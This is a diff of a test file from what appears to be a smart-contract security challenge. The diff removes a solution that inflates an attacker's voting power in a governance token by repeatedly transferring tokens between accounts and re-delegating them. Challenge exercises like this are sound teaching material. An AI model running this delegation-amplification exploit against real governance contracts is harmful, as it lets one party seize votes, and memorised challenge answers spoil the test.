@@ -41,27 +41,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  let admnAddress = await adminUser.getAddress()
-  let attAddress = await attacker.getAddress()
-  let o1Address = await o1.getAddress()
-  let o2Address = await o2.getAddress()
-
-  // vote displacement + amplification attack
-  await governanceToken.connect(attacker).transfer(o1Address,precision.mul(499))
-  await governanceToken.connect(attacker).delegate(admnAddress)
-
-  await governanceToken.connect(o1).transfer(attAddress,precision.mul(499))
-  await governanceToken.connect(attacker).delegate(attAddress)
-
-  await governanceToken.connect(attacker).transfer(o1Address,precision.mul(1))
-  await governanceToken.connect(o1).delegate(admnAddress)
-
-  await governanceToken.connect(attacker).transfer(o1Address,precision.mul(499))
-  await governanceToken.connect(o1).delegate(attAddress)
-
-  await governanceToken.connect(o1).transfer(o2Address,precision.mul(500))
-  await governanceToken.connect(o2).delegate(attAddress)
-
 });
 
 /// expected final state
